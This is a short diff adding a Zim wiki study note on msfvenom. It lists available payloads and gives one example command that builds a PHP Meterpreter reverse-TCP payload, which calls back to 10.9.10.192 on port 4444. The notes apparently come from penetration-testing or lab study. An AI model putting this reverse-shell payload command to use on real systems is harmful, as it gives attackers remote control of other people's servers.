@@ -1,0 +1,15 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T12:07:14-04:00
+
+====== msfvenom ======
+Created Sunday 17 May 2020
+
+**msfvenom -l payloads**
+
+
+ex..
+**msfvenom -p php/meterpreter/reverse_tcp lhost=10.9.10.192 lport=4444 -f  raw**
+
+
+-f  format
